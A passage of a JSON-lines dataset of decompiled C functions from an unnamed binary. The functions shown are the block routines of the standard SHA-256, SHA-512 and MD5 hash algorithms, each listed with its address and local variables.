uVar8 | uVar6 & uVar14);\niVar2 = uVar13 + local_158[0x38] + 0x19a4c116 +\n((uVar9 >> 0xb | uVar9 * 0x200000) ^ (uVar9 >> 6 | uVar9 * 0x4000000) ^\n(uVar9 >> 0x19 | uVar9 * 0x80)) + ((uVar10 ^ uVar11) & uVar9 ^ uVar11);\nuVar8 = uVar8 + iVar2;\nuVar12 = ((uVar7 >> 0xd | uVar7 * 0x80000) ^ (uVar7 >> 2 | uVar7 * 0x40000000) ^\n(uVar7 >> 0x16 | uVar7 * 0x400)) + iVar2 + ((uVar7 | uVar6) & uVar14 | uVar7 & uVar6);\niVar2 = uVar11 + local_158[0x39] + 0x1e376c08 +\n((uVar8 >> 0xb | uVar8 * 0x200000) ^ (uVar8 >> 6 | uVar8 * 0x4000000) ^\n(uVar8 >> 0x19 | uVar8 * 0x80)) + ((uVar9 ^ uVar10) & uVar8 ^ uVar10);\nuVar14 = uVar14 + iVar2;\nuVar11 = ((uVar12 >> 0xd | uVar12 * 0x80000) ^ (uVar12 >> 2 | uVar12 * 0x40000000) ^\n(uVar12 >> 0x16 | uVar12 * 0x400)) + iVar2 + ((uVar12 | uVar7) & uVar6 | uVar12 & uVar7);\niVar2 = uVar10 + local_158[0x3a] + 0x2748774c +\n((uVar14 >> 0xb | uVar14 * 0x200000) ^ (uVar14 >> 6 | uVar14 * 0x4000000) ^\n(uVar14 >> 0x19 | uVar14 * 0x80)) + ((uVar8 ^ uVar9) & uVar14 ^ uVar9);\nuVar6 = uVar6 + iVar2;\nuVar10 = ((uVar11 >> 0xd | uVar11 * 0x80000) ^ (uVar11 >> 2 | uVar11 * 0x40000000) ^\n(uVar11 >> 0x16 | uVar11 * 0x400)) + iVar2 +\n((uVar11 | uVar12) & uVar7 | uVar11 & uVar12);\niVar2 = uVar9 + local_158[0x3b] + 0x34b0bcb5 +\n((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 >> 6 | uVar6 * 0x4000000) ^\n(uVar6 >> 0x19 | uVar6 * 0x80)) + ((uVar14 ^ uVar8) & uVar6 ^ uVar8);\nuVar7 = uVar7 + iVar2;\nuVar9 = ((uVar10 >> 0xd | uVar10 * 0x80000) ^ (uVar10 >> 2 | uVar10 * 0x40000000) ^\n(uVar10 >> 0x16 | uVar10 * 0x400)) + iVar2 +\n((uVar10 | uVar11) & uVar12 | uVar10 & uVar11);\niVar2 = uVar8 + local_158[0x3c] + 0x391c0cb3 +\n((uVar7 >> 0xb | uVar7 * 0x200000) ^ (uVar7 >> 6 | uVar7 * 0x4000000) ^\n(uVar7 >> 0x19 | uVar7 * 0x80)) + ((uVar6 ^ uVar14) & uVar7 ^ uVar14);\nuVar12 = uVar12 + iVar2;\nuVar8 = ((uVar9 >> 0xd | uVar9 * 0x80000) ^ (uVar9 >> 2 | uVar9 * 0x40000000) ^\n(uVar9 >> 0x16 | uVar9 * 0x400)) + iVar2 + ((uVar9 | uVar10) & uVar11 | uVar9 & uVar10);\niVar2 = uVar14 + local_158[0x3d] + 0x4ed8aa4a +\n((uVar12 >> 0xb | uVar12 * 0x200000) ^ (uVar12 >> 6 | uVar12 * 0x4000000) ^\n(uVar12 >> 0x19 | uVar12 * 0x80)) + ((uVar7 ^ uVar6) & uVar12 ^ uVar6);\nuVar11 = uVar11 + iVar2;\nuVar13 = ((uVar8 >> 0xd | uVar8 * 0x80000) ^ (uVar8 >> 2 | uVar8 * 0x40000000) ^\n(uVar8 >> 0x16 | uVar8 * 0x400)) + iVar2 + ((uVar8 | uVar9) & uVar10 | uVar8 & uVar9);\niVar2 = uVar6 + local_158[0x3e] + 0x5b9cca4f +\n((uVar11 >> 0xb | uVar11 * 0x200000) ^ (uVar11 >> 6 | uVar11 * 0x4000000) ^\n(uVar11 >> 0x19 | uVar11 * 0x80)) + ((uVar12 ^ uVar7) & uVar11 ^ uVar7);\nuVar10 = uVar10 + iVar2;\nuVar6 = ((uVar13 >> 0xd | uVar13 * 0x80000) ^ (uVar13 >> 2 | uVar13 * 0x40000000) ^\n(uVar13 >> 0x16 | uVar13 * 0x400)) + iVar2 + ((uVar13 | uVar8) & uVar9 | uVar13 & uVar8);\niVar2 = uVar7 + local_158[0x3f] + 0x682e6ff3 +\n((uVar10 >> 0xb | uVar10 * 0x200000) ^ (uVar10 >> 6 | uVar10 * 0x4000000) ^\n(uVar10 >> 0x19 | uVar10 * 0x80)) + ((uVar11 ^ uVar12) & uVar10 ^ uVar12);\nuVar9 = uVar9 + iVar2;\nuVar7 = ((uVar6 >> 0xd | uVar6 * 0x80000) ^ (uVar6 >> 2 | uVar6 * 0x40000000) ^\n(uVar6 >> 0x16 | uVar6 * 0x400)) + iVar2 + ((uVar6 | uVar13) & uVar8 | uVar6 & uVar13);\niVar2 = uVar12 + local_158[0x40] + 0x748f82ee +\n((uVar9 >> 0xb | uVar9 * 0x200000) ^ (uVar9 >> 6 | uVar9 * 0x4000000) ^\n(uVar9 >> 0x19 | uVar9 * 0x80)) + ((uVar10 ^ uVar11) & uVar9 ^ uVar11);\nuVar8 = uVar8 + iVar2;\nuVar12 = ((uVar7 >> 0xd | uVar7 * 0x80000) ^ (uVar7 >> 2 | uVar7 * 0x40000000) ^\n(uVar7 >> 0x16 | uVar7 * 0x400)) + iVar2 + ((uVar7 | uVar6) & uVar13 | uVar7 & uVar6);\niVar2 = uVar11 + local_158[0x41] + 0x78a5636f +\n((uVar8 >> 0xb | uVar8 * 0x200000) ^ (uVar8 >> 6 | uVar8 * 0x4000000) ^\n(uVar8 >> 0x19 | uVar8 * 0x80)) + ((uVar9 ^ uVar10) & uVar8 ^ uVar10);\nuVar13 = uVar13 + iVar2;\nuVar11 = ((uVar12 >> 0xd | uVar12 * 0x80000) ^ (uVar12 >> 2 | uVar12 * 0x40000000) ^\n(uVar12 >> 0x16 | uVar12 * 0x400)) + iVar2 + ((uVar12 | uVar7) & uVar6 | uVar12 & uVar7);\niVar2 = uVar10 + local_158[0x42] + -0x7b3787ec +\n((uVar13 >> 0xb | uVar13 * 0x200000) ^ (uVar13 >> 6 | uVar13 * 0x4000000) ^\n(uVar13 >> 0x19 | uVar13 * 0x80)) + ((uVar8 ^ uVar9) & uVar13 ^ uVar9);\nuVar6 = uVar6 + iVar2;\nuVar10 = ((uVar11 >> 0xd | uVar11 * 0x80000) ^ (uVar11 >> 2 | uVar11 * 0x40000000) ^\n(uVar11 >> 0x16 | uVar11 * 0x400)) + iVar2 +\n((uVar11 | uVar12) & uVar7 | uVar11 & uVar12);\niVar2 = uVar9 + local_158[0x43] + -0x7338fdf8 +\n((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 >> 6 | uVar6 * 0x4000000) ^\n(uVar6 >> 0x19 | uVar6 * 0x80)) + ((uVar13 ^ uVar8) & uVar6 ^ uVar8);\nuVar7 = uVar7 + iVar2;\nuVar9 = ((uVar10 >> 0xd | uVar10 * 0x80000) ^ (uVar10 >> 2 | uVar10 * 0x40000000) ^\n(uVar10 >> 0x16 | uVar10 * 0x400)) + iVar2 +\n((uVar10 | uVar11) & uVar12 | uVar10 & uVar11);\niVar2 = uVar8 + local_158[0x44] + -0x6f410006 +\n((uVar7 >> 0xb | uVar7 * 0x200000) ^ (uVar7 >> 6 | uVar7 * 0x4000000) ^\n(uVar7 >> 0x19 | uVar7 * 0x80)) + ((uVar6 ^ uVar13) & uVar7 ^ uVar13);\nlocal_158[7] = uVar12 + iVar2;\nlocal_158[3] = ((uVar9 >> 0xd | uVar9 * 0x80000) ^ (uVar9 >> 2 | uVar9 * 0x40000000) ^\n(uVar9 >> 0x16 | uVar9 * 0x400)) + iVar2 +\n((uVar9 | uVar10) & uVar11 | uVar9 & uVar10);\niVar2 = uVar13 + local_158[0x45] + -0x5baf9315 +\n((local_158[7] >> 0xb | local_158[7] * 0x200000) ^\n(local_158[7] >> 6 | local_158[7] * 0x4000000) ^\n(local_158[7] >> 0x19 | local_158[7] * 0x80)) + ((uVar7 ^ uVar6) & local_158[7] ^ uVar6);\nlocal_158[6] = uVar11 + iVar2;\nlocal_158[2] = ((local_158[3] >> 0xd | local_158[3] * 0x80000) ^\n(local_158[3] >> 2 | local_158[3] * 0x40000000) ^\n(local_158[3] >> 0x16 | local_158[3] * 0x400)) + iVar2 +\n((local_158[3] | uVar9) & uVar10 | local_158[3] & uVar9);\niVar2 = uVar6 + local_158[0x46] + -0x41065c09 +\n((local_158[6] >> 0xb | local_158[6] * 0x200000) ^\n(local_158[6] >> 6 | local_158[6] * 0x4000000) ^\n(local_158[6] >> 0x19 | local_158[6] * 0x80)) +\n((local_158[7] ^ uVar7) & local_158[6] ^ uVar7);\nlocal_158[5] = uVar10 + iVar2;\nlocal_158[1] = ((local_158[2] >> 0xd | local_158[2] * 0x80000) ^\n(local_158[2] >> 2 | local_158[2] * 0x40000000) ^\n(local_158[2] >> 0x16 | local_158[2] * 0x400)) + iVar2 +\n((local_158[2] | local_158[3]) & uVar9 | local_158[2] & local_158[3]);\niVar2 = ((local_158[6] ^ local_158[7]) & local_158[5] ^ local_158[7]) +\nuVar7 + local_158[0x47] + -0x398e870e +\n((local_158[5] >> 0xb | local_158[5] * 0x200000) ^\n(local_158[5] >> 6 | local_158[5] * 0x4000000) ^\n(local_158[5] >> 0x19 | local_158[5] * 0x80));\nlocal_158[4] = uVar9 + iVar2;\niVar2 = ((local_158[1] | local_158[2]) & local_158[3] | local_158[1] & local_158[2]) +\niVar2 + ((local_158[1] >> 0xd | local_158[1] * 0x80000) ^\n(local_158[1] >> 2 | local_158[1] * 0x40000000) ^\n(local_158[1] >> 0x16 | local_158[1] * 0x400));\nlVar3 = 0;\nwhile( true ) {\npiVar1 = (int *)(param_1 + 8 + lVar3);\n*piVar1 = *piVar1 + iVar2;\nif (lVar3 + 4 == 0x20) break;\niVar2 = *(int *)((long)local_158 + lVar3 + 4);\nlVar3 = lVar3 + 4;\n}\nreturn 0;\n}\nLocal Variable: local_3c : undefined4\nLocal Variable: local_40 : undefined4\nLocal Variable: local_44 : undefined4\nLocal Variable: local_48 : undefined4\nLocal Variable: local_4c : undefined4\nLocal Variable: local_50 : undefined4\nLocal Variable: local_54 : undefined4\nLocal Variable: local_58 : undefined4\nLocal Variable: local_5c : undefined4\nLocal Variable: local_60 : undefined4\nLocal Variable: local_64 : undefined4\nLocal Variable: local_68 : undefined4\nLocal Variable: local_6c : undefined4\nLocal Variable: local_70 : undefined4\nLocal Variable: local_74 : undefined4\nLocal Variable: local_78 : undefined4\nLocal Variable: local_7c : undefined4\nLocal Variable: local_80 : undefined4\nLocal Variable: local_84 : undefined4\nLocal Variable: local_88 : undefined4\nLocal Variable: local_8c : undefined4\nLocal Variable: local_90 : undefined4\nLocal Variable: local_94 : undefined4\nLocal Variable: local_98 : undefined4\nLocal Variable: local_9c : undefined4\nLocal Variable: local_a0 : undefined4\nLocal Variable: local_a4 : undefined4\nLocal Variable: local_a8 : undefined4\nLocal Variable: local_ac : undefined4\nLocal Variable: local_b0 : undefined4\nLocal Variable: local_b4 : undefined4\nLocal Variable: local_b8 : undefined4\nLocal Variable: local_bc : undefined4\nLocal Variable: local_c0 : undefined4\nLocal Variable: local_c4 : undefined4\nLocal Variable: local_c8 : undefined4\nLocal Variable: local_cc : undefined4\nLocal Variable: local_d0 : undefined4\nLocal Variable: local_d4 : undefined4\nLocal Variable: local_d8 : undefined4\nLocal Variable: local_dc : undefined4\nLocal Variable: local_e0 : undefined4\nLocal Variable: local_e4 : undefined4\nLocal Variable: local_e8 : undefined4\nLocal Variable: local_ec : undefined4\nLocal Variable: local_f0 : undefined4\nLocal Variable: local_f4 : undefined4\nLocal Variable: local_f8 : undefined4\nLocal Variable: local_fc : undefined4\nLocal Variable: local_100 : undefined4\nLocal Variable: local_104 : undefined4\nLocal Variable: local_108 : undefined4\nLocal Variable: local_10c : undefined4\nLocal Variable: local_110 : undefined4\nLocal Variable: local_114 : undefined4\nLocal Variable: local_118 : undefined4\nLocal Variable: local_11c : undefined4\nLocal Variable: local_120 : undefined4\nLocal Variable: local_124 : undefined4\nLocal Variable: local_128 : undefined4\nLocal Variable: local_12c : undefined4\nLocal Variable: local_130 : undefined4\nLocal Variable: local_134 : undefined4\nLocal Variable: local_138 : undefined4\nLocal Variable: local_13c : undefined4\nLocal Variable: local_140 : undefined4\nLocal Variable: local_144 : undefined4\nLocal Variable: local_148 : undefined4\nLocal Variable: local_14c : undefined4\nLocal Variable: local_150 : undefined4\nLocal Variable: local_154 : undefined4\nLocal Variable: local_158 : undefined4\nLocal Variable: local_160 : undefined8"}
{"Function Name": "FUN_00403da0", "Address": "00403da0", "Source Code": "undefined8 FUN_00403da0(long param_1,ulong *param_2)\n{\nundefined **ppuVar1;\nlong *plVar2;\nundefined *puVar3;\nundefined *puVar4;\nundefined *puVar5;\nint iVar6;\nlong lVar7;\nundefined **ppuVar8;\nundefined **ppuVar9;\nulong uVar10;\nundefined *puVar11;\nundefined *puVar12;\nundefined *puVar13;\nundefined *puVar14;\nundefined *puVar15;\nundefined *local_2f8 [89];\n\nlVar7 = 0;\ndo {\n*(undefined8 *)((long)local_2f8 + lVar7) = *(undefined8 *)(param_1 + 8 + lVar7);\nlVar7 = lVar7 + 8;\n} while (lVar7 != 0x40);\niVar6 = 0;\ndo {\nuVar10 = *param_2;\nlVar7 = (long)iVar6;\niVar6 = iVar6 + 1;\nparam_2 = param_2 + 1;\nlocal_2f8[lVar7 + 8] =\n(undefined *)\n(uVar10 >> 0x38 | (uVar10 & 0xff000000000000) >> 0x28 | (uVar10 & 0xff0000000000) >> 0x18 |\n(uVar10 & 0xff00000000) >> 8 | (uVar10 & 0xff000000) << 8 | (uVar10 & 0xff0000) << 0x18 |\n(uVar10 & 0xff00) << 0x28 | uVar10 << 0x38);\n} while (iVar6 != 0x10);\nppuVar8 = local_2f8 + 0x16;\ndo {\npuVar4 = *ppuVar8;\npuVar5 = ppuVar8[-0xd];\nppuVar9 = ppuVar8 + 1;\nppuVar8[2] = ppuVar8[-0xe] + (long)ppuVar8[-5] +\n(((ulong)puVar5 >> 8 | (long)puVar5 << 0x38) ^\n((ulong)puVar5 >> 1 | (long)puVar5 << 0x3f) ^ (ulong)puVar5 >> 7) +\n(((ulong)puVar4 >> 0x3d | (long)puVar4 << 3) ^\n((ulong)puVar4 >> 0x13 | (long)puVar4 << 0x2d) ^ (ulong)puVar4 >> 6);\nppuVar8 = ppuVar9;\n} while (ppuVar9 != local_2f8 + 0x56);\nppuVar9 = (undefined **)&DAT_0043d540;\nppuVar8 = local_2f8;\ndo {\nppuVar8 = ppuVar8 + 8;\npuVar4 = local_2f8[3] +\n(long)(*ppuVar9 +\n(long)(*ppuVar8 +\n(((ulong)local_2f8[6] ^ (ulong)local_2f8[5]) & (ulong)local_2f8[4] ^\n(ulong)local_2f8[6]) +\n(((ulong)local_2f8[4] >> 0x12 | (long)local_2f8[4] << 0x2e) ^\n((ulong)local_2f8[4] >> 0xe | (long)local_2f8[4] << 0x32) ^\n((ulong)local_2f8[4] >> 0x29 | (long)local_2f8[4] << 0x17))) +\n(long)local_2f8[7]);\npuVar14 = *ppuVar9 +\n(long)(*ppuVar8 +\n(((ulong)local_2f8[6] ^ (ulong)local_2f8[5]) & (ulong)local_2f8[4] ^\n(ulong)local_2f8[6]) +\n(((ulong)local_2f8[4] >> 0x12 | (long)local_2f8[4] << 0x2e) ^\n((ulong)local_2f8[4] >> 0xe | (long)local_2f8[4] << 0x32) ^\n((ulong)local_2f8[4] >> 0x29 | (long)local_2f8[4] << 0x17))) +\n(long)local_2f8[7] +\n(((ulong)local_2f8[0] >> 0x22 | (long)local_2f8[0] << 0x1e) ^\n((ulong)local_2f8[0] >> 0x1c | (long)local_2f8[0] << 0x24) ^\n((ulong)local_2f8[0] >> 0x27 | (long)local_2f8[0] << 0x19)) +\n(((ulong)local_2f8[1] | (ulong)local_2f8[0]) & (ulong)local_2f8[2] |\n(ulong)local_2f8[1] & (ulong)local_2f8[0]);\nuVar10 = ((ulong)local_2f8[5] ^ (ulong)local_2f8[4]) & (ulong)puVar4 ^ (ulong)local_2f8[5];\npuVar3 = ppuVar8[1] +\n(long)(ppuVar9[1] +\n(((ulong)puVar4 >> 0x12 | (long)puVar4 << 0x2e) ^\n((ulong)puVar4 >> 0xe | (long)puVar4 << 0x32) ^\n((ulong)puVar4 >> 0x29 | (long)puVar4 * 0x800000)) +\n(long)(local_2f8[2] + (long)local_2f8[6] + uVar10));\npuVar12 = ppuVar8[1] +\n(long)(ppuVar9[1] +\n(((ulong)puVar4 >> 0x12 | (long)puVar4 << 0x2e) ^\n((ulong)puVar4 >> 0xe | (long)puVar4 << 0x32) ^\n((ulong)puVar4 >> 0x29 | (long)puVar4 * 0x800000)) +\n(long)(local_2f8[6] +\nuVar10 + (((ulong)puVar14 >> 0x22 | (long)puVar14 * 0x40000000) ^\n((ulong)puVar14 >> 0x1c | (long)puVar14 << 0x24) ^\n((ulong)puVar14 >> 0x27 | (long)puVar14 * 0x2000000)) +\n(((ulong)puVar14 | (ulong)local_2f8[0]) & (ulong)local_2f8[1] |\n(ulong)puVar14 & (ulong)local_2f8[0])));\nuVar10 = ((ulong)puVar4 ^ (ulong)local_2f8[4]) & (ulong)puVar3 ^ (ulong)local_2f8[4];\npuVar5 = ppuVar8[2] +\n(long)(ppuVar9[2] +\n(((ulong)puVar3 >> 0x12 | (long)puVar3 << 0x2e) ^\n((ulong)puVar3 >> 0xe | (long)puVar3 << 0x32) ^\n((ulong)puVar3 >> 0x29 | (long)puVar3 * 0x800000)) +\n(long)(local_2f8[1] + (long)local_2f8[5] + uVar10));\npuVar11 = ppuVar8[2] +\n(long)(ppuVar9[2] +\n(((ulong)puVar3 >> 0x12 | (long)puVar3 << 0x2e) ^\n((ulong)puVar3 >> 0xe | (long)puVar3 << 0x32) ^\n((ulong)puVar3 >> 0x29 | (long)puVar3 * 0x800000)) +\n(long)(local_2f8[5] +\nuVar10 + (((ulong)puVar12 | (ulong)puVar14) & (ulong)local_2f8[0] |\n(ulong)puVar12 & (ulong)puVar14) +\n(((ulong)puVar12 >> 0x22 | (long)puVar12 * 0x40000000) ^\n((ulong)puVar12 >> 0x1c | (long)puVar12 << 0x24) ^\n((ulong)puVar12 >> 0x27 | (long)puVar12 * 0x2000000))));\npuVar15 = local_2f8[0] +\n(long)(ppuVar8[3] +\n(long)(ppuVar9[3] +\n(((ulong)puVar5 >> 0x12 | (long)puVar5 << 0x2e) ^\n((ulong)puVar5 >> 0xe | (long)puVar5 << 0x32) ^\n((ulong)puVar5 >> 0x29 | (long)puVar5 * 0x800000)) +\n(long)(local_2f8[4] +\n(((ulong)puVar3 ^ (ulong)puVar4) & (ulong)puVar5 ^ (ulong)puVar4))))\n;\npuVar13 = ppuVar8[3] +\n(long)(ppuVar9[3] +\n(((ulong)puVar5 >> 0x12 | (long)puVar5 << 0x2e) ^\n((ulong)puVar5 >> 0xe | (long)puVar5 << 0x32) ^\n((ulong)puVar5 >> 0x29 | (long)puVar5 * 0x800000)) +\n(long)(local_2f8[4] +\n(((ulong)puVar3 ^ (ulong)puVar4) & (ulong)puVar5 ^ (ulong)puVar4))) +\n(((ulong)puVar11 | (ulong)puVar12) & (ulong)puVar14 | (ulong)puVar11 & (ulong)puVar12)\n+ (((ulong)puVar11 >> 0x22 | (long)puVar11 * 0x40000000) ^\n((ulong)puVar11 >> 0x1c | (long)puVar11 << 0x24) ^\n((ulong)puVar11 >> 0x27 | (long)puVar11 * 0x2000000));\nlocal_2f8[7] = puVar14 + (long)(ppuVar9[4] +\n(long)(ppuVar8[4] +\n(((ulong)puVar15 >> 0x12 | (long)puVar15 << 0x2e) ^\n((ulong)puVar15 >> 0xe | (long)puVar15 << 0x32) ^\n((ulong)puVar15 >> 0x29 | (long)puVar15 * 0x800000))) +\n(long)puVar4 +\n(((ulong)puVar5 ^ (ulong)puVar3) & (ulong)puVar15 ^ (ulong)puVar3\n));\nlocal_2f8[3] = ppuVar9[4] +\n(long)(ppuVar8[4] +\n(((ulong)puVar15 >> 0x12 | (long)puVar15 << 0x2e) ^\n((ulong)puVar15 >> 0xe | (long)puVar15 << 0x32) ^\n((ulong)puVar15 >> 0x29 | (long)puVar15 * 0x800000))) + (long)puVar4 +\n(((ulong)puVar5 ^ (ulong)puVar3) & (ulong)puVar15 ^ (ulong)puVar3) +\n(((ulong)puVar13 | (ulong)puVar11) & (ulong)puVar12 |\n(ulong)puVar13 & (ulong)puVar11) +\n(((ulong)puVar13 >> 0x22 | (long)puVar13 * 0x40000000) ^\n((ulong)puVar13 >> 0x1c | (long)puVar13 << 0x24) ^\n((ulong)puVar13 >> 0x27 | (long)puVar13 * 0x2000000));\nlocal_2f8[6] = ppuVar9[5] +\n(long)(ppuVar8[5] +\n(((ulong)local_2f8[7] >> 0x12 | (long)local_2f8[7] << 0x2e) ^\n((ulong)local_2f8[7] >> 0xe | (long)local_2f8[7] << 0x32) ^\n((ulong)local_2f8[7] >> 0x29 | (long)local_2f8[7] * 0x800000))) +\n(long)(puVar12 +\n(long)(puVar3 + (((ulong)puVar15 ^ (ulong)puVar5) & (ulong)local_2f8[7] ^\n(ulong)puVar5)));\nlocal_2f8[2] = ppuVar9[5] +\n(long)(ppuVar8[5] +\n(((ulong)local_2f8[7] >> 0x12 | (long)local_2f8[7] << 0x2e) ^\n((ulong)local_2f8[7] >> 0xe | (long)local_2f8[7] << 0x32) ^\n((ulong)local_2f8[7] >> 0x29 | (long)local_2f8[7] * 0x800000))) +\n(long)(puVar3 + (((ulong)puVar15 ^ (ulong)puVar5) & (ulong)local_2f8[7] ^\n(ulong)puVar5) +\n(((ulong)local_2f8[3] | (ulong)puVar13) & (ulong)puVar11 |\n(ulong)local_2f8[3] & (ulong)puVar13) +\n(((ulong)local_2f8[3] >> 0x22 | (long)local_2f8[3] * 0x40000000) ^\n((ulong)local_2f8[3] >> 0x1c | (long)local_2f8[3] << 0x24) ^\n((ulong)local_2f8[3] >> 0x27 | (long)local_2f8[3] * 0x2000000)));\nlocal_2f8[5] = ppuVar9[6] +\n(long)(ppuVar8[6] +\n(((ulong)local_2f8[6] >> 0x12 | (long)local_2f8[6] << 0x2e) ^\n((ulong)local_2f8[6] >> 0xe | (long)local_2f8[6] << 0x32) ^\n((ulong)local_2f8[6] >> 0x29 | (long)local_2f8[6] * 0x800000))) +\n(long)(puVar11 +\n(long)(puVar5 + (((ulong)local_2f8[7] ^ (ulong)puVar15) &\n(ulong)local_2f8[6] ^ (ulong)puVar15)));\nlocal_2f8[1] = ppuVar9[6] +\n(long)(ppuVar8[6] +\n(((ulong)local_2f8[6] >> 0x12 | (long)local_2f8[6] << 0x2e) ^\n((ulong)local_2f8[6] >> 0xe | (long)local_2f8[6] << 0x32) ^\n((ulong)local_2f8[6] >> 0x29 | (long)local_2f8[6] * 0x800000))) +\n(long)(puVar5 + (((ulong)local_2f8[7] ^ (ulong)puVar15) & (ulong)local_2f8[6] ^\n(ulong)puVar15) +\n(((ulong)local_2f8[2] | (ulong)local_2f8[3]) & (ulong)puVar13 |\n(ulong)local_2f8[2] & (ulong)local_2f8[3]) +\n(((ulong)local_2f8[2] >> 0x22 | (long)local_2f8[2] * 0x40000000) ^\n((ulong)local_2f8[2] >> 0x1c | (long)local_2f8[2] << 0x24) ^\n((ulong)local_2f8[2] >> 0x27 | (long)local_2f8[2] * 0x2000000)));\nppuVar1 = ppuVar9 + 7;\nppuVar9 = ppuVar9 + 8;\nlocal_2f8[4] = puVar13 + (long)(puVar15 + (long)(*ppuVar1 +\n(long)(ppuVar8[7] +\n(((ulong)local_2f8[5] >> 0x12 |\n(long)local_2f8[5] << 0x2e) ^\n((ulong)local_2f8[5] >> 0xe |\n(long)local_2f8[5] << 0x32) ^\n((ulong)local_2f8[5] >> 0x29 |\n(long)local_2f8[5] * 0x800000)))) +\n(((ulong)local_2f8[6] ^ (ulong)local_2f8[7]) &\n(ulong)local_2f8[5] ^ (ulong)local_2f8[7]));\nlocal_2f8[0] = puVar15 + (long)(*ppuVar1 +\n(long)(ppuVar8[7] +\n(((ulong)local_2f8[5] >> 0x12 | (long)local_2f8[5] << 0x2e)\n^ ((ulong)local_2f8[5] >> 0xe | (long)local_2f8[5] << 0x32\n) ^ ((ulong)local_2f8[5] >> 0x29 |\n(long)local_2f8[5] * 0x800000)))) +\n(((ulong)local_2f8[6] ^ (ulong)local_2f8[7]) & (ulong)local_2f8[5] ^\n(ulong)local_2f8[7]) +\n(((ulong)local_2f8[1] | (ulong)local_2f8[2]) & (ulong)local_2f8[3] |\n(ulong)local_2f8[1] & (ulong)local_2f8[2]) +\n(((ulong)local_2f8[1] >> 0x22 | (long)local_2f8[1] * 0x40000000) ^\n((ulong)local_2f8[1] >> 0x1c | (long)local_2f8[1] << 0x24) ^\n((ulong)local_2f8[1] >> 0x27 | (long)local_2f8[1] * 0x2000000));\n} while (ppuVar9 != &PTR_s_sha512_0043d7c0);\nlVar7 = 0;\nwhile( true ) {\nplVar2 = (long *)(param_1 + 8 + lVar7);\n*plVar2 = (long)(local_2f8[0] + *plVar2);\nif (lVar7 + 8 == 0x40) break;\nlocal_2f8[0] = *(undefined **)((long)local_2f8 + lVar7 + 8);\nlVar7 = lVar7 + 8;\n}\nreturn 0;\n}\nLocal Variable: local_48 : undefined1\nLocal Variable: local_238 : undefined8\nLocal Variable: local_248 : undefined8\nLocal Variable: local_270 : undefined8\nLocal Variable: local_280 : undefined8\nLocal Variable: local_288 : undefined8\nLocal Variable: local_290 : undefined8\nLocal Variable: local_298 : undefined8\nLocal Variable: local_2a0 : undefined8\nLocal Variable: local_2a8 : undefined8\nLocal Variable: local_2b0 : undefined8\nLocal Variable: local_2b8 : undefined8\nLocal Variable: local_2c0 : undefined8\nLocal Variable: local_2c8 : undefined8\nLocal Variable: local_2d0 : undefined8\nLocal Variable: local_2d8 : undefined8\nLocal Variable: local_2e0 : undefined8\nLocal Variable: local_2e8 : undefined8\nLocal Variable: local_2f0 : undefined8\nLocal Variable: local_2f8 : undefined8\nLocal Variable: local_300 : undefined8"}
{"Function Name": "FUN_00404320", "Address": "00404320", "Source Code": "undefined8 FUN_00404320(long param_1,long param_2)\n{\nuint uVar1;\nlong lVar2;\nuint uVar3;\nuint uVar4;\nuint uVar5;\nuint uVar6;\nuint uVar7;\nuint uVar8;\nint local_78 [18];\n\nlVar2 = 0;\ndo {\n*(undefined4 *)((long)local_78 + lVar2) = *(undefined4 *)(param_2 + lVar2);\nlVar2 = lVar2 + 4;\n} while (lVar2 != 0x40);\nuVar1 = *(uint *)(param_1 + 0xc);\nuVar3 = ((*(uint *)(param_1 + 0x14) ^ *(uint *)(param_1 + 0x10)) & uVar1 ^\n*(uint *)(param_1 + 0x14)) + *(int *)(param_1 + 8) + -0x28955b88 + local_78[0];\nuVar3 = (uVar3 * 0x80 | uVar3 >> 0x19) + uVar1;\nuVar5 = *(int *)(param_1 + 0x14) + -0x173848aa + local_78[1] +\n((*(uint *)(param_1 + 0x10) ^ uVar1) & uVar3 ^ *(uint *)(param_1 + 0x10));\nuVar6 = (uVar5 * 0x1000 | uVar5 >> 0x14) + uVar3;\nuVar5 = *(int *)(param_1 + 0x10) + 0x242070db + local_78[2] + ((uVar3 ^ uVar1) & uVar6 ^ uVar1);\nuVar4 = (uVar5 * 0x20000 | uVar5 >> 0xf) + uVar6;\nuVar5 = uVar1 + 0xc1bdceee + local_78[3] + ((uVar6 ^ uVar3) & uVar4 ^ uVar3);\nuVar5 = (uVar5 * 0x400000 | uVar5 >> 10) + uVar4;\nuVar3 = ((uVar4 ^ uVar6) & uVar5 ^ uVar6) + uVar3 + 0xf57c0faf + local_78[4];\nuVar3 = (uVar3 * 0x80 | uVar3 >> 0x19) + uVar5;\nuVar6 = uVar6 + 0x4787c62a + local_78[5] + ((uVar5 ^ uVar4) & uVar3 ^ uVar4);\nuVar6 = (uVar6 * 0x1000 | uVar6 >> 0x14) + uVar3;\nuVar4 = uVar4 + 0xa8304613 + local_78[6] + ((uVar3 ^ uVar5) & uVar6 ^ uVar5);\nuVar4 = (uVar4 * 0x20000 | uVar4 >> 0xf) + uVar6;\nuVar5 = uVar5 + 0xfd469501 + local_78[7] + ((uVar6 ^ uVar3) & uVar4 ^ uVar3);\nuVar5 = (uVar5 * 0x400000 | uVar5 >> 10) + uVar4;\nuVar3 = ((uVar4 ^ uVar6) & uVar5 ^ uVar6) + uVar3 + 0x698098d8 + local_78[8];\nuVar3 = (uVar3 * 0x80 | uVar3 >> 0x19) + uVar5;\nuVar6 = uVar6 + 0x8b44f7af + local_78[9] + ((uVar5 ^ uVar4) & uVar3 ^ uVar4);\nuVar6 = (uVar6 * 0x1000 | uVar6 >> 0x14) + uVar3;\nuVar4 = (uVar4 - 0xa44f) + local_78[10] + ((uVar3 ^ uVar5) & uVar6 ^ uVar5);\nuVar4 = (uVar4 * 0x20000 | uVar4 >> 0xf) + uVar6;\nuVar5 = uVar5 + 0x895cd7be + local_78[0xb] + ((uVar6 ^ uVar3) & uVar4 ^ uVar3);\nuVar5 = (uVar5 * 0x400000 | uVar5 >> 10) + uVar4;\nuVar3 = ((uVar4 ^ uVar6) & uVar5 ^ uVar6) + uVar3 + 0x6b901122 + local_78[0xc];\nuVar3 = (uVar3 * 0x80 | uVar3 >> 0x19) + uVar5;\nuVar6 = uVar6 + 0xfd987193 + local_78[0xd] + ((uVar5 ^ uVar4) & uVar3 ^ uVar4);\nuVar6 = (uVar6 * 0x1000 | uVar6 >> 0x14) + uVar3;\nuVar4 = uVar4 + 0xa679438e + local_78[0xe] + ((uVar3 ^ uVar5) & uVar6 ^ uVar5);\nuVar4 = (uVar4 * 0x20000 | uVar4 >> 0xf) + 